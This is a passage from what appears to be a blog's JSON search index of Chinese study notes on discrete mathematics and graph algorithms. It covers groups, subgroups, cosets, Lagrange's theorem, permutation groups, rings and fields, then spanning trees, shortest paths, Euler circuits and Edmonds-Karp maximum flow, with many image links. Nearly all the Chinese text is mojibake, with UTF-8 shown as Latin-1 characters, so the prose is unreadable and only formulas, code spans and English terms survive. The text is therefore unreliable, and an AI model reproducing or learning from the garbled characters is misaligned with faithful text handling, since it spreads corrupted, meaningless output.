æ„æˆã€‚\n\n`<é›†åˆ,è¿ç®—>` æ„æˆä¸€ä¸ªä»£æ•°ç³»ç»Ÿã€‚\n### åŒæ„\n\n![image.png](https://pic.moyuin.top/2025/05/16/6826eb9687ca7.png)\n\næ³¨æ„ï¼š**æ»¡è¶³ä¸€ä¸ªæ˜ å°„**å³å¯è¯´ä¸¤ç»„ä»£æ•°ç³»ç»ŸåŒæ„ã€‚\n\n### åŒä½™\n![image.png](https://pic.moyuin.top/2025/05/16/6826eed1cdbbd.png)\nè¿™ä¸ªåŒä½™åœ¨ä¹‹å‰çš„å­¦ä¹ ä¸­ä¹Ÿæœ‰æåŠï¼Œå¥½åƒæ˜¯å…³ç³»é‡Œçš„ï¼Œå¯ä»¥å›å»çœ‹çœ‹ã€‚\n\n---\n## ç¾¤\n\n### å¹¿ç¾¤ã€åŠç¾¤ã€å¹ºç¾¤ã€ç¾¤\n- è‹¥ä»£æ•°ç³»ç»Ÿå°é—­ï¼Œç§°å…¶ä¸ºå¹¿ç¾¤ã€‚\n- è‹¥ä»£æ•°ç³»ç»Ÿå°é—­ã€å¯ç»“åˆ,åˆ™å…¶ä¸ºåŠç¾¤ã€‚\n- è‹¥V=å°é—­ã€å¯ç»“åˆã€æœ‰eï¼Œåˆ™ä¸ºå¹ºç¾¤(ç‹¬å¼‚ç‚¹)\n- è‹¥å°é—­ï¼Œå¯ç»“åˆï¼Œæœ‰ eï¼Œåˆ™ä¸ºç¾¤ã€‚\n\næˆ‘ä»¬åšé¢˜ï¼Œå°±æ˜¯åˆ¤æ–­è¿™ä¸ªé¢˜æ˜¯å¦ä¸º\"ç¾¤\"ã€‚\nåˆ¤æ–­è¿™ä¸ªä»£æ•°ç³»ç»Ÿæ˜¯å¦ä¸ºç¾¤ï¼Œè¿™ä¸ªä¾‹é¢˜ï¼š\n![image.png](https://pic.moyuin.top/2025/05/19/682ad4ace6ada.png)\nç”¨è¿ç®—åˆ†åˆ«åˆ¤æ–­å°é—­ï¼Œç»“åˆï¼Œå•ä½å…ƒï¼Œé€†å…ƒï¼Œä»è€Œåˆ¤æ–­ã€‚\n### Klein ç¾¤\nå’Œå‘¨æœŸæŒ‚é’©ã€‚\n![image.png](https://pic.moyuin.top/2025/05/19/682ae2c9ade1d.png)\n\n### Abel ç¾¤ï¼ˆäº¤æ¢ç¾¤ï¼‰\n**ç¬¦åˆäº¤æ¢å¾‹çš„ç¾¤**å³ä¸ºäº¤æ¢ç¾¤ï¼Œåˆå«ä½œ abel ç¾¤ã€‚\n#### å®šç†\n- å·²çŸ¥ `<G,*>` æ˜¯ç¾¤ï¼ŒG æ˜¯äº¤æ¢ç¾¤ = å¯¹äºä»»æ„å…ƒç´  a, b æœ‰ `(a*b)*(a*b)=(a*a)*(b*b)`\n\tè¿™æ˜¯ä¸€ä¸ªå……è¦æ¡ä»¶ã€‚\n### ç¾¤çš„æ€§è´¨\n#### è¡¨è¡¨ç¤º\nç¾¤æ˜¯å¯ä»¥ç”¨è¿ç®—è¡¨è¡¨ç¤ºçš„ï¼Œå¯¹äºç¾¤ï¼Œæˆ‘ä»¬çœ‹è¿ç®—è¡¨å¯ä»¥è·å¾—å®ƒçš„å°é—­ï¼Œå¯ç»“åˆï¼Œé€†å…ƒï¼Œå•ä½å…ƒã€‚\n![image.png](https://pic.moyuin.top/2025/05/19/682ad65198ca4.png)\n\n#### ç¾¤çš„å¹‚\n![image.png](https://pic.moyuin.top/2025/05/19/682addd5f3305.png)\n![image.png](https://pic.moyuin.top/2025/05/19/682adcc4cbf80.png)\n\nè´Ÿæ•°å¹‚æ€ä¹ˆæ“ä½œï¼Ÿå–é€†å…ƒåå†è¿›è¡Œå¹‚è¿ç®—ã€‚\n æ¨¡è¿ç®— ï¼šâ€œæ¨¡ p åŠ æ³•æ„æ€å°±æ˜¯ï¼ˆa+bï¼‰mod p çš„å€¼â€ã€‚\n![image.png](https://pic.moyuin.top/2025/05/23/6830195f41548.png)\n\n#### å…ƒç´ çš„å‘¨æœŸï¼ˆå…ƒç´ çš„é˜¶ï¼‰\næ³¨æ„ï¼Œ**å¯¹äºç¾¤è€Œè¨€ï¼Œç¾¤çš„é˜¶è¡¨è¾¾çš„æ˜¯ç¾¤çš„å…ƒç´ ä¸ªæ•°**ï¼Œè¿™é‡Œè§£é‡Šçš„æ˜¯å…ƒç´ çš„é˜¶ã€‚\n![image.png](https://pic.moyuin.top/2025/05/19/682add5618e86.png)\n![image.png](https://pic.moyuin.top/2025/05/19/682ae296eacd8.png)\n\nå‘¨æœŸä¸å¹‚æœ‰å…³ï¼Œå¯¹å…ƒç´ ä½œ n æ¬¡å¹‚ï¼Œè®©å…ƒç´ è½¬åŒ–ä¸ºå•ä½å…ƒï¼Œé‚£ä¹ˆå¯ä»¥è¯´è¯¥å…ƒç´ çš„å‘¨æœŸä¸º nã€‚\nå…¶å®è¿™æ ·å­åœ¨æ¨¡è¿ç®—é‡Œä¹Ÿæ¯”è¾ƒéš¾è¯†åˆ«çš„ã€‚æ¨¡è¿ç®—è½¬åŒ–ä¸ºä¸€ç§ä¹˜æ³•è¿ç®—ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ã€‚\n- å•ä½å…ƒçš„é˜¶ï¼ˆå‘¨æœŸï¼‰ä¸º 1ã€‚\n> è¿™ä¸ªâ€œé™Œç”Ÿâ€çš„è¿ç®—ï¼Œå…¶å®æ˜¯å¤§å­¦æŠ½è±¡ä»£æ•°é‡Œæœ€ç»å…¸ã€æœ€ç®€å•çš„ç¾¤ä¹‹ä¸€ï¼Œå«åš**æ•´æ•°æ¨¡nåŠ æ³•ç¾¤**ï¼Œè®°ä½œ (Znâ€‹,+)ã€‚æˆ‘ä»¬çš„ G é›†åˆå°±æ˜¯ Z8â€‹ çš„ä¸€ä¸ªâ€œäºŒè¿›åˆ¶é©¬ç”²â€ã€‚\n\nå¯¹äºè¿™ç§ç¾¤ï¼Œæœ‰ä¸€ä¸ª**æ±‚å‘¨æœŸçš„é»„é‡‘å…¬å¼**ï¼š\n\n**å…ƒç´  k çš„å‘¨æœŸ = `m/gcd(k,m)`**\n\nè¿™é‡Œçš„å­—æ¯ä»£è¡¨ï¼š\n- **m**: ç¾¤é‡Œä¸€å…±æœ‰å¤šå°‘ä¸ªå…ƒç´ ã€‚åœ¨è¿™é“é¢˜é‡Œï¼Œ`G`æœ‰8ä¸ªå…ƒç´ ï¼Œæ‰€ä»¥ m=8ã€‚\n- **k**: æˆ‘ä»¬è¦è®¡ç®—çš„é‚£ä¸ªå…ƒç´ æ‰€ä»£è¡¨çš„åè¿›åˆ¶æ•°ã€‚æ¯”å¦‚ `010` ä»£è¡¨ 2ï¼Œ`110` ä»£è¡¨ 6ã€‚\n- **gcd(k,m)**: k å’Œ m çš„**æœ€å¤§å…¬çº¦æ•°** (Greatest Common Divisor)ã€‚å°±æ˜¯èƒ½åŒæ—¶æ•´é™¤ k å’Œ m çš„æœ€å¤§æ­£æ•´æ•°ã€‚\n#### å®šç†\n- 1. å¹‚çš„æ™®é€šè¿ç®—\n\n- 2. å¹‚ä¸é€†å…ƒ\n\t![image.png](https://pic.moyuin.top/2025/05/19/682adfba7bf5c.png)\n\n- 3.ç¾¤æ— é›¶å…ƒ\n\tæœ‰é›¶å…ƒä»£è¡¨è¯¥ä»£æ•°ç³»ç»Ÿ**æ— é€†å…ƒ**ï¼Œè€Œç¾¤çš„åŸºæœ¬æ€§è´¨å°±æ˜¯æœ‰é€†å…ƒï¼Œå› æ­¤å†²çªï¼Œæ¨å‡ºç¾¤æ— é€†å…ƒã€‚æ³¨æ„å‘¨æœŸå¤§äºç­‰äº 2ã€‚\n\t![image.png](https://pic.moyuin.top/2025/05/19/682ae1d0135ef.png)\n\n- 4. ä¸€å…ƒä¸€æ¬¡ç¾¤æ–¹ç¨‹æœ‰è§£ï¼Œä¸”è§£å”¯ä¸€ã€‚\n\t![image.png](https://pic.moyuin.top/2025/05/19/682ae0941c74f.png)\n- 5. ç¾¤æ»¡è¶³æ¶ˆå»å¾‹\n\t ![image.png](https://pic.moyuin.top/2025/05/19/682ae1add7df3.png)\n- 6. ç¾¤çš„é˜¶ï¼Œ`a^k=e` ç›¸å½“äºé˜¶ `r|k`\n\t![image.png](https://pic.moyuin.top/2025/05/19/682ae3208eefd.png)\n\n### å­ç¾¤\nç±»ä¼¼äºå­é›†å§ã€‚å­ç¾¤ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯ä¸€ä¸ªç¾¤çš„ä¸€éƒ¨åˆ†ï¼Œä¸€ä¸ªä»£æ•°ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ã€‚\n![image.png](https://pic.moyuin.top/2025/05/19/682ae502564ac.png)\n\nå­ç¾¤ä¾ç„¶ç¬¦åˆç¾¤çš„å„ç§æ€§è´¨ï¼š\n- å°é—­\n- å¯ç»“åˆ\n- å•ä½å…ƒ\n- æ¯ä¸ªå…ƒç´ æœ‰é€†å…ƒ\n\n#### å­ç¾¤å¿«æ·åˆ¤æ–­å®šç†\n1.ï¼ˆ1ï¼‰ä»»ä½• a, b å±äº H, æœ‰ `a*b` å±äº Hã€‚\nï¼ˆ2ï¼‰æ‰€æœ‰ a å±äº H éƒ½æœ‰ a^-1 å±äº Hã€‚\n![image.png](https://pic.moyuin.top/2025/05/23/68301c181bff4.png)\n2. ä»»ä½• aï¼Œb å±äº H éƒ½æœ‰ `a*b^-1` å±äº Hã€‚ï¼ˆé€†å…ƒæ··æ²Œå°é—­ï¼‰\n![image.png](https://pic.moyuin.top/2025/05/23/68301cdd800c7.png)\n3. ä»»æ„ aï¼Œb å±äº H éƒ½æœ‰ `a*b` å±äº Hã€‚(åªå°é—­)\n![image.png](https://pic.moyuin.top/2025/05/23/68301e5e1cd7c.png)\n\n#### å¾ªç¯å­ç¾¤\nå®šä¹‰ï¼šç”± a çš„å¹‚æ¬¡æ–¹ç»„æˆçš„å­ç¾¤ç§°ä¸ºå¾ªç¯å­ç¾¤æˆ–è€…ç”Ÿæˆå­ç¾¤ï¼Œè®°ä¸º `<a,*>` æˆ– `<a>`\n![image.png](https://pic.moyuin.top/2025/05/23/68302364aeafb.png)\n\n![image.png](https://pic.moyuin.top/2025/05/23/6830281205314.png)\n\n---\n### é™ªé›†\né™ªé›†æ˜¯ä¸€ç§é›†åˆè€Œéç¾¤ï¼Œå®ƒç›¸å½“äºæ˜¯ä¸€ç§æ˜ å°„å…³ç³»çš„é›†åˆã€‚\n![image.png](https://pic.moyuin.top/2025/05/23/68302940ab6a1.png)\n\n#### å®šç†\n1.ï¼ˆ1ï¼‰ä¸å•ä½å…ƒå»ºç«‹æ˜ å°„çš„å³é™ªé›†ç­‰äºåŸæ¥çš„å­ç¾¤ã€‚\nï¼ˆ2ï¼‰ä¸å¸¸æ•°é¡¹å»ºç«‹æ˜ å°„çš„å³é™ªé›†ç­‰äºåŸæ¥çš„å­ç¾¤çš„å€ã€‚\n![image.png](https://pic.moyuin.top/2025/05/23/68302a88a4042.png) 2. å­ç¾¤æ˜¯å¯¹ç¾¤çš„åˆ’åˆ†ï¼Œæ˜¯ç›¸åŒå…³ç³»çš„é›†åˆã€‚\n![image.png](https://pic.moyuin.top/2025/05/23/68302af68b0f4.png) 3. é™ªé›†ä¸ç­‰ä»·å…³ç³»\n![image.png](https://pic.moyuin.top/2025/05/26/68340d800bc99.png)\nå¯¹äºç­‰ä»·ç±» `[a]`, å¯¹äºä¸€ä¸ªå­ç¾¤ Hï¼Œå®ƒçš„æ‰€æœ‰çš„å·¦ï¼ˆæˆ–è€…å³ï¼‰é™ªé›†çš„é›†åˆï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªå­ç¾¤ H çš„ç­‰ä»·ç±»çš„é›†åˆã€‚\n- **æ ¸å¿ƒéƒ½æ˜¯åˆ’åˆ†ï¼š** ç­‰ä»·å…³ç³»çš„æ ¸å¿ƒä½œç”¨æ˜¯**åˆ’åˆ† (Partition)** ä¸€ä¸ªé›†åˆã€‚é™ªé›†çš„ä½œç”¨ä¹Ÿå®Œå…¨ä¸€æ ·ï¼Œå®ƒå°†ä¸€ä¸ªå¤§ç¾¤ G **åˆ’åˆ†**æˆè‹¥å¹²ä¸ªå¤§å°ç›¸ç­‰ã€äº’ä¸ç›¸äº¤çš„å­é›†ï¼ˆé™ªé›†ï¼‰ã€‚æ¯ä¸ªå…ƒç´  gâˆˆG éƒ½å±äºä¸”ä»…å±äºä¸€ä¸ªé™ªé›†ã€‚\n![image.png](https://pic.moyuin.top/2025/05/26/683411643a531.png)\n\n---\n\n### æ‹‰æ ¼æœ—æ—¥å®šç†\nç‰¹æŒ‡å­ç¾¤å…ƒç´ çš„æ‹‰æ ¼æœ—æ—¥å®šç†ã€‚ç»“åˆåˆšæ‰çš„ç¾¤å®šç†ï¼Œæ€»ç»“å‡ºç¾¤çš„å››ä¸ªå®šç†ï¼Œå‰ä¸‰æ¡å›é¡¾ã€‚\n1. ![image.png](https://pic.moyuin.top/2025/05/26/683414773c58e.png)\n2.![image.png](https://pic.moyuin.top/2025/05/26/683414939463b.png)\n3.![image.png](https://pic.moyuin.top/2025/05/26/6834149e790c5.png)\nå®šç† 3 è¿˜æœ‰ä¸€ä¸ªæ¨è®ºï¼š\n![image.png](https://pic.moyuin.top/2025/05/26/683414bb95ba9.png) \n\n**æ‹‰æ ¼æœ—æ—¥å®šç†**\n![image.png](https://pic.moyuin.top/2025/05/26/68341541976c5.png)\næˆ–è€…è¯´ï¼Œå­ç¾¤çš„å…ƒç´ ä¸ªæ•°æ˜¯æ¯ç¾¤çš„å› æ•°ã€‚\n> **åœ¨ä¸€ä¸ªæœ‰é™ç¾¤ä¸­ï¼Œä»»ä½•ä¸€ä¸ªå…ƒç´ çš„é˜¶ï¼Œéƒ½å¿…ç„¶èƒ½æ•´é™¤è¿™ä¸ªç¾¤çš„é˜¶ã€‚**\n\nä¹Ÿæœ‰ä¸€ç§è¡¨è¾¾ï¼š\n>  å¯¹äºä¸€ä¸ªæœ‰é™ç¾¤ `G` å’Œå®ƒçš„ä»»æ„ä¸€ä¸ªå­ç¾¤ `H`ï¼Œç¾¤ `G` çš„é˜¶ï¼ˆå…ƒç´ ä¸ªæ•°ï¼Œè®°ä½œ âˆ£Gâˆ£ï¼‰å¿…ç„¶æ˜¯å­ç¾¤ `H` çš„é˜¶ï¼ˆâˆ£Hâˆ£ï¼‰çš„æ•´æ•°å€ã€‚\n\nè¿™æ˜¯å¯¹äºç¾¤ `G` ä¸ºæœ‰é™ç¾¤è€Œè¨€ï¼Œå­ç¾¤ `H` çš„é™ªé›†æ•°ç›®æ˜¯æœ‰é™çš„ã€‚\nå½“ç¾¤ `G` ä¸ºæ— é™ç¾¤ï¼Œé™ªé›†æ•°å¯èƒ½æœ‰é™ï¼Œå¯èƒ½æ— é™ï¼Œè¦ä¾èµ–é€‰å–çš„å­ç¾¤æ¥ç¡®å®šã€‚æ‹‰æ ¼æœ—æ—¥å®šç†åªé€‚ç”¨äºæœ‰é™ç¾¤ã€‚\n\n---\n### ç½®æ¢ç¾¤\nå¥½åƒå°±æ˜¯æŠŠæ´—ç‰Œçš„æŒ‡ä»¤é›†åˆä¸ºç¾¤ã€‚\n![image.png](https://pic.moyuin.top/2025/05/26/6834188e3730f.png)\n\nä¹˜ç§¯/å¤åˆï¼š`Ïƒ âˆ˜ Ï„` ï¼ˆæˆ–å†™ä½œ `ÏƒÏ„`ï¼‰ï¼Œå…ˆæŒ‰ `Ïƒ` çš„æŒ‡ä»¤æ“ä½œï¼Œç„¶åæŒ‰ `Ï„` çš„æŒ‡ä»¤æ“ä½œï¼Œæ„æˆä¸€ä¸ªæ–°çš„æ’åˆ—ã€‚\n> **æ³¨æ„ï¼š** åœ¨æ•°å­¦ä¸Šï¼Œè¿ç®—é¡ºåºé€šå¸¸æ˜¯**ä»å³å¾€å·¦**çš„ã€‚ä½†æ˜¯è¿™é‡Œ PPT ä¸Šè¿™ä¹ˆå¤„ç†ï¼Œæ‰€ä»¥è·Ÿç€ PPT çš„æ¥å§ã€‚\n![image.png](https://pic.moyuin.top/2025/05/26/683418cec60f2.png)\n#### å®šç†\n![image.png](https://pic.moyuin.top/2025/05/26/683418ee50f18.png)\nå°±æ˜¯æŠŠ\"æ´—ç‰Œé¡ºåº\"ï¼Œæ‰€æœ‰çš„æ–¹æ³•é›†åˆï¼Œæ„æˆäº†ä¸€ä¸ªç½®æ¢ç¾¤ã€‚\n\n---\n## ç¯ä¸ç¯åŸŸ\n![image.png](https://pic.moyuin.top/2025/05/26/68341a84e329c.png)\n![image.png](https://pic.moyuin.top/2025/05/26/68341a9cf39ed.png)\n**ç¾¤ â†’ ç¯ â†’ åŸŸ**ï¼Œæ˜¯ä¸€ä¸ªèƒ½åŠ›ä¸æ–­å¢å¼ºï¼Œé™åˆ¶è¶Šæ¥è¶Šä¸¥æ ¼çš„è¿‡ç¨‹ã€‚**ç¯æ˜¯æ¯”ç¾¤å¤šäº†ä¸€ä¸ªä¹˜æ³•è¿ç®—çš„ç»“æ„ï¼ŒåŸŸæ˜¯æ¯”ç¯å¤šäº†ä¸€ä¸ªé™¤æ³•è¿ç®—çš„ç»“æ„ã€‚**","tags":["å­¦ä¹ ","ç¦»æ•£æ•°å­¦"],"categories":["æ—¥å¸¸å­¦ä¹ ","ç¦»æ•£æ•°å­¦"]},{"title":"ç¦»æ•£æ•°å­¦&æ•°æ®ç»“æ„-å›¾è®ºå¸¸åŒ¹é…é—®é¢˜ä¸ç®—æ³•æ¦‚æ‹¬","url":"/2025/05/12/xue-xi/shu-xue/chi-san-shu-xue-shu-ju-jie-gou-tu-lun-chang-pi-pei-wen-ti-yu-suan-fa-gai-gua/","content":"# ç¦»æ•£æ•°å­¦&æ•°æ®ç»“æ„-å›¾è®ºå¸¸åŒ¹é…é—®é¢˜ä¸ç®—æ³•æ¦‚æ‹¬\n## åŸºæœ¬å›¾è®ºç®—æ³•\n### ä¸€ã€æœ€å°ç”Ÿæˆæ ‘ï¼ˆMinimum Spanning Treeï¼ŒMSTï¼‰\n\n- **å…³é”®è¯**ï¼šè¿é€šã€é€ ä»·æœ€å°ã€è¦†ç›–æ‰€æœ‰ç‚¹ã€ä¸å…³æ³¨è·¯å¾„ã€ä¸æˆç¯\n- **å…¸å‹é¢˜å¹²**ï¼š\n    \n    > è®¾è®¡ä¸€ä¸ªé€šä¿¡ç½‘ç»œï¼Œä½¿æ‰€æœ‰åŸå¸‚èƒ½äº’ç›¸é€šä¿¡ä¸”é€ ä»·æœ€å°ã€‚\n- **å¸¸ç”¨ç®—æ³•**ï¼š\n    - **Kruskal**ï¼šæŒ‰è¾¹æƒå‡åºæ’åºï¼Œé€æ¡é€‰å…¥ï¼Œä¸æˆç¯ä¸ºå‡†ã€‚\n    - **Prim**ï¼šä»ä»»æ„ç‚¹å‡ºå‘ï¼Œé€æ­¥æ‰©å±•æœ€çŸ­è¿è¾¹è¿›é›†åˆã€‚\n- **é€‚ç”¨é—®é¢˜ç±»å‹**ï¼š\n    - ç½‘ç»œå»ºè®¾ã€åŸå¸‚è¿æ¥ã€é“ºè®¾ç”µç¼†ã€å¸ƒçº¿ç­‰\n\n---\n\n### äºŒã€æœ€çŸ­è·¯å¾„ï¼ˆSingle/All Pairs Shortest Pathï¼‰\n\n- **å…³é”®è¯**ï¼šä»æŸç‚¹åˆ°æŸç‚¹è·¯å¾„æœ€çŸ­ã€æœ‰å‘/æ— å‘å›¾ã€æœ‰æƒå›¾\n- **å…¸å‹é¢˜å¹²**\n    > æ±‚ A åŸå¸‚åˆ°å…¶ä»–åŸå¸‚çš„æœ€çŸ­è·¯å¾„ã€‚\n- **å¸¸ç”¨ç®—æ³•**ï¼š\n    - **Dijkstra**ï¼šæ­£æƒå›¾å•æºæœ€çŸ­è·¯å¾„ï¼ˆå¸¸ç”¨äºåœ°å›¾/ç½‘è·¯å»¶è¿Ÿï¼‰\n    - **SPFA**ï¼šè´Ÿè¾¹æƒä¹Ÿèƒ½è·‘ï¼Œé€‚ç”¨äºç¨€ç–å›¾\n    - **Floyd**ï¼šæ‰€æœ‰ç‚¹å¯¹æœ€çŸ­è·¯å¾„ï¼Œä¸‰é‡å¾ªç¯ï¼ˆé€‚ç”¨äºç¨ å¯†å›¾ï¼‰\n- **é€‚ç”¨é—®é¢˜ç±»å‹**ï¼š\n    - åœ°å›¾å¯¼èˆªã€è·¯çº¿è§„åˆ’ã€ç½‘ç»œå»¶è¿Ÿæœ€å°åŒ–\n---\n\n### ä¸‰ã€æ—…è¡Œå•†é—®é¢˜ï¼ˆTraveling Salesman Problemï¼ŒTSPï¼‰\n\n- **å…³é”®è¯**ï¼šè®¿é—®æ‰€æœ‰ç‚¹ã€åªè®¿é—®ä¸€æ¬¡ã€å½¢æˆé—­ç¯ã€æœ€çŸ­è·¯å¾„\n- **å…¸å‹é¢˜å¹²**ï¼š\n    > æŸäººéœ€è®¿é—®æ‰€æœ‰åŸå¸‚ä¸€æ¬¡å¹¶è¿”å›èµ·ç‚¹ï¼Œæ±‚æœ€çŸ­è·¯çº¿ã€‚\n- **å¸¸ç”¨ç®—æ³•**ï¼š\n    - æš´åŠ›æœç´¢ / çŠ¶å‹ DP / åˆ†æ”¯é™ç•Œ / å¯å‘å¼æœç´¢ï¼ˆå¦‚é—ä¼ ç®—æ³•ï¼‰\n- **é€‚ç”¨é—®é¢˜ç±»å‹**\n    - å¿«é€’è·¯çº¿ã€å¤–å–é€è´§ã€åŸå¸‚å·¡å›é—®é¢˜\n---\n\n### å››ã€ä¸­å›½é‚®è·¯é—®é¢˜ï¼ˆEuler å›è·¯ï¼‰\n- **å…³é”®è¯**ï¼šèµ°éæ‰€æœ‰**è¾¹**ä¸€æ¬¡ã€ä¸é‡å¤ã€å›åˆ°èµ·ç‚¹æˆ–ä¸å›èµ·ç‚¹\n- **å…¸å‹é¢˜å¹²**ï¼š\n    > é‚®é€’å‘˜éœ€è¦ç»è¿‡æ¯æ¡è¡—é“ä¸€æ¬¡ï¼Œå¦‚ä½•è§„åˆ’è·¯çº¿ï¼Ÿ\n- **å¸¸ç”¨ç®—æ³•**ï¼š\n    - **Hierholzer ç®—æ³•**ï¼šæ‰¾æ¬§æ‹‰å›è·¯æˆ–è·¯å¾„\n    - **åˆ¤æ–­æ¡ä»¶**ï¼š\n        - æ¬§æ‹‰å›è·¯ï¼šæ‰€æœ‰ç‚¹åº¦æ•°ä¸ºå¶æ•°\n        - æ¬§æ‹‰è·¯å¾„ï¼šæœ€å¤šä¸¤ä¸ªç‚¹ä¸ºå¥‡æ•°åº¦\n- **é€‚ç”¨é—®é¢˜ç±»å‹**ï¼š\n    - é‚®é€’ã€æ¸…æ‰«æœºå™¨äººã€å·¡æ£€çº¿è·¯é—®é¢˜\n---\n\n### äº”ã€æ‹“æ‰‘æ’åºé—®é¢˜ï¼ˆDAG ä¸Šçš„æ’åºï¼‰\n- **å…³é”®è¯**ï¼šæœ‰å‘æ— ç¯å›¾ã€å…ˆä¿®è¯¾ç¨‹ã€ä¾èµ–å…³ç³»ã€é¡ºåºå®‰æ’\n- **å…¸å‹é¢˜å¹²**ï¼š\n    > ç»™å®šè¯¾ç¨‹ä¾èµ–å…³ç³»ï¼Œå®‰æ’ä¸Šè¯¾é¡ºåºã€‚\n- **å¸¸ç”¨ç®—æ³•**ï¼š\n    - **æ‹“æ‰‘æ’åºï¼ˆBFS/Kahnï¼‰**\n    - **DFS å»ºåºåˆ—ï¼ˆé€†ååºï¼‰**\n---\n\n### ä¸€çœ¼çœ‹å›¾è¯†é¢˜æŠ€å·§\n\n|é—®é¢˜å…³é”®è¯|å±äºå“ªä¸€ç±»|åº”ç”¨ç®—æ³•|\n|---|---|---|\n|è¿é€šã€é€ ä»·æœ€å°|æœ€å°ç”Ÿæˆæ ‘ï¼ˆMSTï¼‰|Prim / Kruskal|\n|èµ·ç‚¹åˆ°å„ç‚¹æœ€çŸ­|æœ€çŸ­è·¯å¾„|Dijkstra / SPFA|\n|æ‰€æœ‰ç‚¹èµ°ä¸€åœˆ|æ—…è¡Œå•†é—®é¢˜ï¼ˆTSPï¼‰|çŠ¶å‹ DP / æœç´¢|\n|æ‰€æœ‰è¾¹èµ°ä¸€é|ä¸­å›½é‚®è·¯ï¼ˆEuler å›è·¯ï¼‰|Hierholzer|\n|æœ‰ä¾èµ–é¡ºåºå®‰æ’|æ‹“æ‰‘æ’åºï¼ˆDAGï¼‰|Kahn / DFS|\n\n---\n## å›¾è®ºç®—æ³•è¡ç”Ÿ\n### ç½‘ç»œæµ\n#### EKç®—æ³•æœ€å¤§æµ\næœ€å¤§æµé—®é¢˜å°±æ˜¯ï¼š\n > æƒ³è±¡ä½ æ˜¯ä¸ªè°ƒæ°´çš„ç®¡é“å·¥ï¼š\n> æœ‰ä¸ª**æºç‚¹ï¼ˆsourceï¼‰**ï¼šæ°´ä»è¿™å„¿å¼€å§‹æµã€‚\n> æœ‰ä¸ª**æ±‡ç‚¹ï¼ˆsinkï¼‰**ï¼šæ°´æœ€ç»ˆè¦æµåˆ°è¿™ã€‚\n> å›¾é‡Œçš„æ¯æ¡è¾¹æ˜¯æ°´ç®¡ï¼Œæœ‰ä¸ª**æœ€å¤§èƒ½æµå¤šå°‘æ°´çš„é™åˆ¶ï¼ˆå®¹é‡ï¼‰**ã€‚\n> ä½ è¦è§£å†³çš„æ ¸å¿ƒé—®é¢˜å°±æ˜¯\n>   â€œä»æºç‚¹æœ€å¤šèƒ½å¾€æ±‡ç‚¹é€å¤šå°‘æ°´ï¼Ÿâ€\n\n- é—®é¢˜ï¼šåœ¨ç»™å®šå®¹é‡é™åˆ¶ä¸‹ï¼Œä»æºç‚¹åˆ°æ±‡ç‚¹çš„æœ€å¤§å¯èƒ½æµé‡ã€‚\n- ç»å…¸ç®—æ³•ï¼šFord-Fulkersonï¼ˆå¢å¹¿è·¯å¾„ï¼‰ã€Edmonds-Karpï¼ˆBFSï¼‰ã€Dinicï¼ˆåˆ†å±‚å›¾ + DFSï¼‰ã€‚\n\nEKç®—æ³•æœ€å¤§æµæ˜¯ï¼š\n>  ç”¨**å¹¿åº¦ä¼˜å…ˆ**å»æ‰¾ï¼šä»æºç‚¹åˆ°æ±‡ç‚¹è¿˜æœ‰æ²¡æœ‰â€œèƒ½é€šçš„æ°´è·¯â€ã€‚\n>  æ‰¾åˆ°å°±â€œå€’æ°´â€ï¼šæ‰¾å‡ºè¿™æ¡è·¯ä¸Šæœ€ç»†çš„é‚£æ ¹ç®¡å­ï¼ˆç“¶é¢ˆï¼‰ï¼Œæ¨è¿™ä¹ˆå¤šæµé‡ã€‚\n>  æ›´æ–°ç®¡é“ï¼šæŠŠç”¨æ‰çš„æµé‡å‡å»ï¼Œå‰©ä¸‹çš„å†æ¥ã€‚\n>  ç›´åˆ°ä½ æ€ä¹ˆæ‰¾éƒ½æ‰¾ä¸åˆ°æ–°è·¯äº†ï¼šé‚£å°±æ˜¯æœ€å¤§æµäº†ã€‚\n\nEdmonds-Karp æ˜¯ä¸€ç§ **åŸºäºå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰** çš„æœ€å¤§æµç®—æ³•ï¼Œå±äº Ford-Fulkerson æ–¹æ³•çš„å®ç°ä¹‹ä¸€ã€‚\n**æ³¨æ„ï¼šç¦»æ•£æ•°å­¦è€ƒè¯•ç»™äºˆç®€åŒ–ç‰ˆæœ¬ï¼Œä¸ç»´æŠ¤åå‘è¾¹ã€‚**\n\n> å®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š  \n> æ¯æ¬¡ç”¨ BFS åœ¨æ®‹é‡ç½‘ç»œä¸­æ‰¾ä¸€æ¡ä»æºç‚¹ `S` åˆ°æ±‡ç‚¹ `T` çš„æœ€çŸ­å¢å¹¿è·¯å¾„ï¼Œç„¶åå°†è¯¥è·¯å¾„ä¸Šçš„å¯å¢å¹¿æµé‡åŠ å…¥åˆ°æ€»æµä¸­ï¼Œå¹¶æ›´æ–°æ®‹é‡ç½‘ç»œã€‚\n##### æ ¸å¿ƒç»“æ„\n- **æ®‹é‡ç½‘ç»œ**ï¼šå¯¹äºæ¯æ¡è¾¹ `(u,v)`ï¼Œæˆ‘ä»¬ç»´æŠ¤ï¼š\n    æ­£å‘è¾¹å®¹é‡ `c(u,v)`\n    å½“å‰æµé‡ `f(u,v)`\n    æ®‹ä½™å®¹é‡ `r(u,v) = c(u,v) - f(u,v)`\n    å¹¶æ·»åŠ åå‘è¾¹ `(v,u)`ï¼Œå…¶æ®‹ä½™å®¹é‡ä¸º `f(u,v)`ï¼Œè¡¨ç¤ºå¯ä»¥â€œé€€å›â€æµé‡ã€‚\n\nå‡è®¾ä½ æœ‰å¦‚ä¸‹å›¾çš„ç½‘ç»œï¼š\n```markdown\nS --(10)--> A --(5)--> T\n \\                      /\n  \\----(15)------------/\n\n```\nä½ ç”¨ BFS æ‰¾åˆ° `S->A->T`ï¼Œå¯å¢å¹¿æµä¸º `5`ï¼Œå†æ‰¾ `S->T`ï¼Œå¯å¢å¹¿æµä¸º `15`ã€‚  \næ€»æµé‡ `5 + 15 = 20`ï¼Œè·¯å¾„æ›´æ–°åä¸èƒ½å†å¢å¹¿ï¼Œç®—æ³•ç»“æŸã€‚\n\n#### æœ€å°å‰²\n- **å‰²**ï¼šå°†æ‰€æœ‰èŠ‚ç‚¹åˆ†ä¸ºä¸¤ä¸ªé›†åˆ `Sé›†åˆ` å’Œ `Té›†åˆ`ï¼Œä½¿å¾—æºç‚¹ `S` åœ¨ `Sé›†åˆ`ï¼Œæ±‡ç‚¹ `T` åœ¨ `Té›†åˆ`ã€‚\n- 